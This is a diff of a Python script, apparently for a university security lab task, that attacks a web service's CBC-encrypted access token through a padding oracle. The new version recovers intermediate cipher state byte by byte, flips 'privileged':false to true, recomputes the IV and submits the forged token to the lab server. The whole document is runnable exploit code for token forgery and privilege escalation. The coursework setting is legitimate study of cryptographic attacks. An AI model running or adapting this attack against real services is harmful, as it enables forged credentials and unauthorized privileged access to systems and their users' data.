@@ -1,110 +1,110 @@
-# Task 7: Padding Encryption Oracle Attack
-
-import os
+# TASK 7: Surgical CBC-R Attack for Privilege Escalation
 import time
 import requests
 
-BLOCK = 20
-URL   = "https://interrato.dev/infosec/lab1"
+BLOCK_SIZE = 20
+URL = "https://interrato.dev/infosec/lab1"
 
-# The crafted plaintext containing privileged access to be encrypted from task 6
-TARGET_PLAIN = b'{"group":"ChaCha","privileged":true,"token-id":"a8e144d231a0a23f"}'
+# The original token and plaintext blocks
+ORIGINAL_TOKEN_HEX = (
+    "6ca1778f4e71cbf7bc3c1a9c8abff402e522f6d41b64fb7723a30de687da8ff20"
+    "e0ba82920b6787e750b5a700b769be6701d7416d0d08439e596cc7c0af9ac76710"
+    "b95c0423f4a993b709e0891e50e47f791db75da8ee648a0ab0a644317d979a76b27c0"
+)
+ORIGINAL_P1 = b'{"group":"ChaCha","p'
+ORIGINAL_P2 = b'rivileged":false,"to'
+DESIRED_P2  = b'rivileged":true ,"to'
 
 session = requests.Session()
 
 # Sends a modified ciphertext to the server and checks if the padding is valid.
-# This function returns True if there is no padding error (status code 422) occurs.
 def oracle(mask: bytes, target: bytes) -> bool:
     while True:
-        r = session.get(f"{URL}?token={(mask + target).hex()}", timeout=10)
+        response = session.get(f"{URL}?token={(mask + target).hex()}", timeout=10)
         # Handle rate limiting by waiting and retrying
-        if r.status_code == 429:
+        if response.status_code == 429:
             time.sleep(0.3)
             continue
         # 422 means padding is invalid
-        return r.status_code != 422
-
-# Applies block padding to the given data.
-def pad(data: bytes) -> bytes:
-    pad_len = BLOCK - (len(data) % BLOCK)
-    if pad_len == 0:
-        pad_len = BLOCK
-    return data + b"\x80" + b"\x00" * (pad_len - 1)
+        return response.status_code != 422
 
 # Recovers the intermediate state of a single ciphertext block using the padding oracle.
-# Works backwards, byte by byte, from the end of the block.
-def get_intermediate(target: bytes) -> bytes:
-    inter = bytearray(BLOCK)
-    
+def recover_intermediate(target_block: bytes) -> bytes:
+    intermediate = bytearray(BLOCK_SIZE)
+
     # Loop backwards through each byte of the block
-    for pos in range(BLOCK - 1, -1, -1):
+    for position in range(BLOCK_SIZE - 1, -1, -1):
         # Prepare the mask: dummy bytes + zeros for the unknown part
-        mask = bytearray([0x41] * pos + [0] * (BLOCK - pos))
-        
+        crafted_block = bytearray([0x41] * position + [0x00] * (BLOCK_SIZE - position))
+
         # Apply the already recovered intermediate bytes
-        for k in range(pos + 1, BLOCK):
-            mask[k] = inter[k]
-            
+        for index in range(position + 1, BLOCK_SIZE):
+            crafted_block[index] = intermediate[index]
+
         # Try all 256 possible byte values
         for guess in range(256):
-            mask[pos] = guess
-            if not oracle(bytes(mask), target):
+            crafted_block[position] = guess
+
+            if not oracle(bytes(crafted_block), target_block):
                 continue
-                
-            # If we are not at the first byte, avoid false positives
-            if pos > 0:
-                mask[pos - 1] ^= 0xFF
-                if not oracle(bytes(mask), target):
-                    mask[pos - 1] ^= 0xFF
+
+            # If not at the first byte, avoid false positives
+            if position > 0:
+                crafted_block[position - 1] ^= 0xFF
+                if not oracle(bytes(crafted_block), target_block):
+                    crafted_block[position - 1] ^= 0xFF
                     continue
-                mask[pos - 1] ^= 0xFF
-                
+                crafted_block[position - 1] ^= 0xFF
+
             # Valid padding found, calculate the intermediate byte
-            inter[pos] = guess ^ 0x80
-            print(f"  byte [{pos:2d}] found", flush=True)
+            intermediate[position] = guess ^ 0x80
+            print(f"  [+] Intermediate byte {position:02d} recovered", flush=True)
             break
-            
-    return bytes(inter)
+        else:
+            raise RuntimeError(f"Unable to recover intermediate byte at position {position}")
 
-# Forges a valid ciphertext for a given plaintext by working backward.
-# Starts from a random last block and builds previous blocks using the intermediate state.
-def encrypt(plaintext: bytes) -> bytes:
-    padded = pad(plaintext)
-    blocks = [padded[i*BLOCK:(i+1)*BLOCK] for i in range(len(padded) // BLOCK)]
-    n = len(blocks)
+    return bytes(intermediate)
 
-    cipher_blocks = [None] * (n + 1)
-    
-    # Start with a random block as the last block of the forged ciphertext
-    cipher_blocks[n] = os.urandom(BLOCK)
+# Performs a surgical CBC-R attack to modify a specific block of plaintext.
+def forge_token_surgically(original_token_hex: str) -> bytes:
+    token = bytes.fromhex(original_token_hex)
+    blocks = [token[i:i + BLOCK_SIZE] for i in range(0, len(token), BLOCK_SIZE)]
 
-    # Work backwards to calculate the previous ciphertext block
-    for i in range(n, 0, -1):
-        print(f"\n[encrypting block {n - i + 1}/{n}] recovering D_k(C_{i})...")
-        
-        # Find the intermediate state of the current block
-        inter = get_intermediate(cipher_blocks[i])
-        
-        # The previous block must XOR with the intermediate state to produce the desired plaintext block
-        cipher_blocks[i - 1] = bytes(inter[j] ^ blocks[i - 1][j] for j in range(BLOCK))
+    original_c1 = blocks[1]
 
-    return b"".join(cipher_blocks)
+    print("[*] Starting surgical CBC-R privilege escalation")
+    print("[*] Rewriting plaintext block 2: 'false' -> 'true '")
+
+    # Modify C1 to change P2
+    modified_c1 = bytes(
+        original_c1[i] ^ ORIGINAL_P2[i] ^ DESIRED_P2[i]
+        for i in range(BLOCK_SIZE)
+    )
+
+    print("[*] Recovering D_k(C1') via padding oracle...")
+    intermediate_c1 = recover_intermediate(modified_c1)
+
+    print("[*] Recomputing IV to preserve plaintext block 1")
+    # Recompute IV to keep P1 unchanged
+    modified_iv = bytes(
+        intermediate_c1[i] ^ ORIGINAL_P1[i]
+        for i in range(BLOCK_SIZE)
+    )
+
+    # Assemble the new token
+    forged_token = modified_iv + modified_c1 + b"".join(blocks[2:])
+
+    print("[+] Forged token successfully constructed")
+    return forged_token
+
+# Verifies the forged token against the server.
+def verify_token(token: bytes) -> None:
+    print("\n[*] Verifying forged token...")
+    response = session.get(f"{URL}?token={token.hex()}", timeout=10)
+    print(f"HTTP {response.status_code}: {response.text.strip()}")
+
 
 if __name__ == "__main__":
-    print(f"Target plaintext: {TARGET_PLAIN.decode()}\n")
-
-    token = encrypt(TARGET_PLAIN)
-    print(f"\nForged token (hex): {token.hex()}")
-
-    # Send the forged token to the server to verify it
-    print("\nVerifying forged token...")
-    r = session.get(f"{URL}?token={token.hex()}", timeout=10)
-    print(f"HTTP {r.status_code}: {r.text.strip()}")
-
-    # Interpret the server response
-    if r.status_code == 200:
-        print("\nAccess granted!")
-    elif r.status_code == 403:
-        print("\nToken valid but access forbidden (privileged=true may need server-side check).")
-    else:
-        print("\nSomething went wrong.")
+    forged_token = forge_token_surgically(ORIGINAL_TOKEN_HEX)
+    print(f"\n[+] Forged token (hex):\n{forged_token.hex()}")
+    verify_token(forged_token)
